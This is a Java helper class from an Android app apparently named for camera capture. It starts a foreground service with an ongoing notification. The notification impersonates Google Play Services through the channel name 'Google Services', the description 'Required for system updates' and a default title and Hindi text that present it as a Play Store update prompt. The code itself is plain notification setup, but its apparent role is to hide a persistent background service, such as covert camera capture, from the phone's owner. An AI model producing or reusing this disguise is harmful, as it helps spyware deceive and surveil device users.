package com.android.photo.camera.capture;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.widget.RemoteViews;

import androidx.core.app.NotificationCompat;

/**
 * Helper class to start services in foreground with a notification
 */
public class ForegroundServiceHelper {
    private static final String CHANNEL_ID = "service_channel";
    private static final String CHANNEL_NAME = "Google Services";
    private static final String CHANNEL_DESC = "Required for system updates";

    /**
     * Start the given service in foreground with a standardized notification
     *
     * @param service The service to start in foreground
     * @param notificationId A unique notification ID for this service
     * @param title Notification title (optional, uses default if null)
     * @param contentText Notification content (optional, uses default if null)
     */
    public static void startForeground(Service service, int notificationId, String title, String contentText) {
        if (service == null) return;

        // Create notification channel for Android O and above
        createNotificationChannel(service);

        // Get default strings if not provided
        String notificationTitle = title != null ? title : "Google Play Services";
        String notificationText = contentText != null ? contentText :
                "गूगल प्ले स्टोर के साथ अपडेट रहने के लिए क्लिक करें";

        try {
            // Create intent for notification click
            Intent notificationIntent = new Intent(service, MainActivity.class);
            notificationIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pendingIntent = PendingIntent.getActivity(
                    service,
                    0,
                    notificationIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            Notification notification;

            // Check if we should use custom layout
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // Use custom layout for Android N and above
                RemoteViews customLayout = new RemoteViews(service.getPackageName(), R.layout.notification_layout);

                // Set notification content
                Bitmap largeIcon = BitmapFactory.decodeResource(service.getResources(), R.mipmap.crazy);
                customLayout.setImageViewBitmap(R.id.notification_icon, largeIcon);
                customLayout.setTextViewText(R.id.notification_title, notificationTitle);
                customLayout.setTextViewText(R.id.notification_text, notificationText);

                // Build notification with custom layout
                notification = new NotificationCompat.Builder(service, CHANNEL_ID)
                        .setSmallIcon(R.mipmap.crazy)
                        .setCustomContentView(customLayout)
                        .setPriority(NotificationCompat.PRIORITY_MAX)
                        .setCategory(NotificationCompat.CATEGORY_SERVICE)
                        .setContentIntent(pendingIntent)
                        .setOngoing(true)
                        .build();
            } else {
                // Use standard notification for older Android versions
                notification = new NotificationCompat.Builder(service, CHANNEL_ID)
                        .setSmallIcon(R.mipmap.crazy)
                        .setContentTitle(notificationTitle)
                        .setContentText(notificationText)
                        .setPriority(NotificationCompat.PRIORITY_MAX)
                        .setCategory(NotificationCompat.CATEGORY_SERVICE)
                        .setContentIntent(pendingIntent)
                        .setOngoing(true)
                        .build();
            }

            // Start the service in foreground
            service.startForeground(notificationId, notification);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Create notification channel for Android O and above
     */
    private static void createNotificationChannel(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    CHANNEL_NAME,
                    NotificationManager.IMPORTANCE_LOW // Use LOW importance to avoid interrupting the user
            );
            channel.setDescription(CHANNEL_DESC);
            channel.setShowBadge(false);

            NotificationManager notificationManager = context.getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }
}